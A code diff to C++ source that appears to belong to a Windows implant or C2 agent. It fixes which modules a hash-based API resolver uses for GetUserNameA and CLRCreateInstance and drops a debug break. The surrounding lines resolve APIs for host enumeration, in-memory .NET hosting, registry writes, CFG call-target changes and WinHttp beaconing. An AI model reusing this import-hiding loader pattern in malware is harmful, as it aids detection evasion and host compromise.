@@ -242,13 +242,11 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.LoadLibraryA, 							ctx->modules.kernel32, LOADLIBRARYA));
 		x_assertb(F_PTR_HMOD(ctx->win32.FreeLibrary, 							ctx->modules.kernel32, FREELIBRARY));
     	x_assertb(F_PTR_HMOD(ctx->win32.IsWow64Process, 						ctx->modules.kernel32, ISWOW64PROCESS));
-		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							ctx->modules.kernel32, GETUSERNAMEA));
 		x_assertb(F_PTR_HMOD(ctx->win32.CreateToolhelp32Snapshot, 				ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
 		x_assertb(F_PTR_HMOD(ctx->win32.Process32First, 						ctx->modules.kernel32, PROCESS32FIRST));
 		x_assertb(F_PTR_HMOD(ctx->win32.Process32Next, 							ctx->modules.kernel32, PROCESS32NEXT));
 		x_assertb(F_PTR_HMOD(ctx->win32.GlobalMemoryStatusEx, 					ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
 		x_assertb(F_PTR_HMOD(ctx->win32.GetComputerNameExA, 					ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
-		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						ctx->modules.kernel32, CLRCREATEINSTANCE));
 		x_assertb(F_PTR_HMOD(ctx->win32.SleepEx, 								ctx->modules.kernel32, SLEEPEX));
     	x_assertb(F_PTR_HMOD(ctx->win32.FindResourceA, 							ctx->modules.kernel32, FINDRESOURCEA));
 		x_assertb(F_PTR_HMOD(ctx->win32.LoadResource, 							ctx->modules.kernel32, LOADRESOURCE));
@@ -257,7 +255,6 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.FreeResource, 							ctx->modules.kernel32, FREERESOURCE));
 		x_assertb(F_PTR_HMOD(ctx->win32.SetProcessValidCallTargets, 			ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
 
-		__debugbreak();
 		// TODO: Memory leak for heap-allocated EXECUTABLE*. Only need DllBase
 		x_assertb(ctx->modules.shlwapi	= (HMODULE) ImportModule(LoadLocalFile, SHLWAPI, nullptr, 0, nullptr)->base);
         x_assertb(ctx->modules.crypt32  = (HMODULE) ImportModule(LoadLocalFile, CRYPT32, nullptr, 0, nullptr)->base);
@@ -266,6 +263,7 @@ namespace Main {
         x_assertb(ctx->modules.iphlpapi = (HMODULE) ImportModule(LoadLocalFile, IPHLPAPI, nullptr, 0, nullptr)->base);
         x_assertb(ctx->modules.mscoree  = (HMODULE) ImportModule(LoadLocalFile, MSCOREE, nullptr, 0, nullptr)->base);
 
+		x_assertb(F_PTR_HMOD(ctx->win32.GetUserNameA, 							ctx->modules.advapi, GETUSERNAMEA));
 		x_assertb(F_PTR_HMOD(ctx->win32.LookupAccountSidW, 						ctx->modules.advapi, LOOKUPACCOUNTSIDW));
 		x_assertb(F_PTR_HMOD(ctx->win32.LookupPrivilegeValueA, 					ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
 		x_assertb(F_PTR_HMOD(ctx->win32.AddMandatoryAce, 						ctx->modules.advapi, ADDMANDATORYACE));
@@ -282,7 +280,9 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.RegCreateKeyExA, 						ctx->modules.advapi, REGCREATEKEYEXA));
 		x_assertb(F_PTR_HMOD(ctx->win32.RegSetValueExA, 						ctx->modules.advapi, REGSETVALUEEXA));
 		x_assertb(F_PTR_HMOD(ctx->win32.RegCloseKey, 							ctx->modules.advapi, REGCLOSEKEY));
+
 		x_assertb(F_PTR_HMOD(ctx->win32.GetAdaptersInfo, 						ctx->modules.iphlpapi, GETADAPTERSINFO));
+		x_assertb(F_PTR_HMOD(ctx->win32.CLRCreateInstance, 						ctx->modules.mscoree, CLRCREATEINSTANCE));
 
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpOpen, 							ctx->modules.winhttp, WINHTTPOPEN));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpConnect, 					    ctx->modules.winhttp, WINHTTPCONNECT));
@@ -297,7 +297,6 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryHeaders, 					ctx->modules.winhttp, WINHTTPQUERYHEADERS));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpQueryDataAvailable, 				ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
 		x_assertb(F_PTR_HMOD(ctx->win32.WinHttpCloseHandle, 					ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
-
 
 		x_assertb(F_PTR_HMOD(ctx->win32.CryptStringToBinaryA, 					ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
 		x_assertb(F_PTR_HMOD(ctx->win32.CryptBinaryToStringA, 					ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
